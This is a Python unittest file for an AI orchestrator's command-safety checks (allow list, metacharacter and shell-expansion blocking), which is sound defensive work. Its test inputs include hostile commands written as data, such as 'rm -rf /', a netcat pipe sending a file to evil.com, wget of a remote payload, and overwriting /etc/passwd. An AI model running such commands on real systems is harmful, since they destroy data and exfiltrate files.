"""Tests for S3: Command Execution Safety.

Covers: command whitelist/blacklist, metacharacter blocking, shell expansion
blocking, shlex parsing, and execute_command integration.
"""

import unittest
import tempfile
import os
import sys

# Stub external dependencies before importing orchestrator
sys.modules.setdefault("google.generativeai", type(sys)("google.generativeai"))

from orchestrator import LancelotOrchestrator, COMMAND_WHITELIST, COMMAND_BLACKLIST_CHARS


def _make_orchestrator(data_dir):
    """Create an orchestrator with stubbed-out external services."""
    for fn in ("USER.md", "RULES.md", "MEMORY_SUMMARY.md"):
        with open(os.path.join(data_dir, fn), "w") as f:
            f.write("test")

    orig_provider = LancelotOrchestrator._init_provider
    orig_cache = LancelotOrchestrator._init_context_cache
    LancelotOrchestrator._init_provider = lambda self: None
    LancelotOrchestrator._init_context_cache = lambda self: None

    try:
        orch = LancelotOrchestrator(data_dir=data_dir)
    finally:
        LancelotOrchestrator._init_provider = orig_provider
        LancelotOrchestrator._init_context_cache = orig_cache

    return orch


class TestCommandWhitelist(unittest.TestCase):

    def setUp(self):
        self.data_dir = tempfile.mkdtemp()
        self.orch = _make_orchestrator(self.data_dir)

    def test_ls_allowed(self):
        valid, reason = self.orch._validate_command("ls /tmp")
        self.assertTrue(valid)

    def test_git_allowed(self):
        valid, reason = self.orch._validate_command("git status")
        self.assertTrue(valid)

    def test_echo_allowed(self):
        valid, reason = self.orch._validate_command("echo hello")
        self.assertTrue(valid)

    def test_rm_blocked(self):
        valid, reason = self.orch._validate_command("rm -rf /")
        self.assertFalse(valid)
        self.assertIn("not in the allowed", reason)

    def test_python_blocked(self):
        valid, reason = self.orch._validate_command("python malware.py")
        self.assertFalse(valid)
        self.assertIn("not in the allowed", reason)

    def test_wget_blocked(self):
        valid, reason = self.orch._validate_command("wget http://evil.com/payload")
        self.assertFalse(valid)
        self.assertIn("not in the allowed", reason)

    def test_curl_blocked(self):
        valid, reason = self.orch._validate_command("curl http://evil.com")
        self.assertFalse(valid)
        self.assertIn("not in the allowed", reason)


class TestCommandChaining(unittest.TestCase):

    def setUp(self):
        self.data_dir = tempfile.mkdtemp()
        self.orch = _make_orchestrator(self.data_dir)

    def test_ampersand_blocked(self):
        valid, reason = self.orch._validate_command("ls && rm -rf /")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_pipe_blocked(self):
        valid, reason = self.orch._validate_command("cat file | nc evil.com 4444")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_semicolon_blocked(self):
        valid, reason = self.orch._validate_command("ls; sudo bash")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_or_chain_blocked(self):
        valid, reason = self.orch._validate_command("false || rm -rf /")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)


class TestShellExpansion(unittest.TestCase):

    def setUp(self):
        self.data_dir = tempfile.mkdtemp()
        self.orch = _make_orchestrator(self.data_dir)

    def test_dollar_paren_blocked(self):
        valid, reason = self.orch._validate_command("echo $(whoami)")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_backtick_blocked(self):
        valid, reason = self.orch._validate_command("echo `id`")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_dollar_brace_blocked(self):
        valid, reason = self.orch._validate_command("echo ${HOME}")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)

    def test_redirect_blocked(self):
        valid, reason = self.orch._validate_command("echo hack > /etc/passwd")
        self.assertFalse(valid)
        self.assertIn("metacharacter", reason)


class TestShlexParsing(unittest.TestCase):

    def setUp(self):
        self.data_dir = tempfile.mkdtemp()
        self.orch = _make_orchestrator(self.data_dir)

    def test_quoted_string_works(self):
        valid, reason = self.orch._validate_command('echo "hello world"')
        self.assertTrue(valid)

    def test_empty_command_rejected(self):
        valid, reason = self.orch._validate_command("")
        self.assertFalse(valid)


class TestExecuteCommandIntegration(unittest.TestCase):
    """Integration: blocked commands return a security error via execute_command."""

    def setUp(self):
        self.data_dir = tempfile.mkdtemp()
        self.orch = _make_orchestrator(self.data_dir)

    def test_blocked_command_returns_security_block(self):
        result = self.orch.execute_command("rm -rf /")
        # The orchestrator may return "SECURITY BLOCK" or a wrapped error
        # message. Either way, the command must NOT execute.
        self.assertTrue(
            "SECURITY BLOCK" in result or "not in the allowed" in result
            or "failed" in result.lower() or "blocked" in result.lower(),
            f"Expected security rejection, got: {result}"
        )

    def test_chained_command_returns_security_block(self):
        result = self.orch.execute_command("ls && rm -rf /")
        self.assertTrue(
            "SECURITY BLOCK" in result or "metacharacter" in result
            or "failed" in result.lower() or "blocked" in result.lower(),
            f"Expected security rejection, got: {result}"
        )


if __name__ == "__main__":
    unittest.main()
